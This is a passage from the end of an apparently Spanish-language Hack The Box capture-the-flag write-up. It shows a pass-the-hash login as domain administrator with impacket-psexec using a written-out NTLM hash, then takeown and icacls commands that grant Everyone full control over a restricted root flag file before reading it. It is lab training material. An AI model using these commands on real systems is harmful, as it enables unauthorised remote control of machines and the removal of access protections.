impacket-psexec -debug 'checkpoint.htb/administrator'@10.129.95.254 -hashes ':f29e9c014295b9b32139b09a2790be3b'
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260915044806.png)


### BANDERA ROOT
Nos dirigimos al directorio personal de <span style="color:blue">max.palmer</span> para encontrar la bandera.

```bash
cd C:\Users\max.palmer\Desktop
```

Si intentamos leer la bandera de root, nos dirá que tenemos denegado el acceso a pesar de ser autoridad del sistema, debido a que el archivo tiene unas **ACLs** (listas de control de acceso) restrictivas que impiden su lectura directamente. 

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260909024551.png)

Lo solucionamos mediante los siguientes comandos, para eliminar así cualquier restricción de acceso:

```bash
# Reclamar la propiedad del archivo como CHECKPOINT\DC01$
takeown /f root.txt

# Otorgar permisos de control total a todos los usuarios del sistema
icacls root.txt /grant Everyone:F
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260909024621.png)

Ya nos dejará leer la bandera de <span style="color:orange">root.txt</span>.

```bash
type root.txt
```

![](/assets/images/htb-writeup-checkpoint/Pasted image 20260909024639.png)
